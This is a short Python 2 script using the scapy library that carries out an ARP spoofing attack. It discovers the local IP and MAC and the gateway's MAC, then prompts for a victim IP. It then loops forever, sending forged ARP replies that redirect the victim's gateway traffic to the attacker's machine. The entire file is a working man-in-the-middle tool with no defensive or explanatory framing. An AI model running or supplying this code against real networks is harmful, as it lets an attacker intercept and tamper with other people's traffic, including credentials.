import socket
import subprocess, shlex
from scapy.all import *
import sys
import time
from uuid import getnode as get_mac

#Myip
#Mymac
#Receiverip
#Receivermac
#Senderip
#sendermac


#Get MY Address!!!!!!!!!!!!
strs = subprocess.check_output(shlex.split('ip r l'))
Myip  = strs.split('src')[-1].split()[0]
Mymac = get_mac()
MyMac =':'.join(("%012X" % Mymac)[i:i+2] for i in range(0, 12, 2))
print "Myip :"+ Myip+"  Mymac :"+MyMac


#Get Receiver Address!!!!!!!!!!!
Receiverip = strs.split('default via')[-1].split()[0]
send(ARP(op=1, pdst=Receiverip, psrc=Myip, hwdst="ff:ff:ff:ff:ff:ff"))
result, unanswered = sr(ARP(op=ARP.who_has, pdst=Receiverip))
Receivermac = result[0][1].hwsrc
print "Receiverip : "+Receiverip+" Receivermac : "+Receivermac

#Get Sender Address!!!!!!!!!!!
Senderip=raw_input("Enter SenderIP : ")
print Senderip
send(ARP(op=1, pdst=Senderip, psrc=Myip, hwdst="ff:ff:ff:ff:ff:ff"))
result, unanswered = sr(ARP(op=ARP.who_has, pdst=Senderip))
Sendermac=result[0][1].hwsrc
print "Senderip : "+Senderip+" Sendermac : "+Sendermac

#Send Arpspoofing
while 1:
	send(ARP(op=2, pdst=Senderip, psrc=Receiverip, hwdst=Sendermac, hwsrc=MyMac))
	send(ARP(op=2, pdst=Senderip, psrc=Receiverip, hwdst=Sendermac, hwsrc=MyMac))
	time.sleep(1)


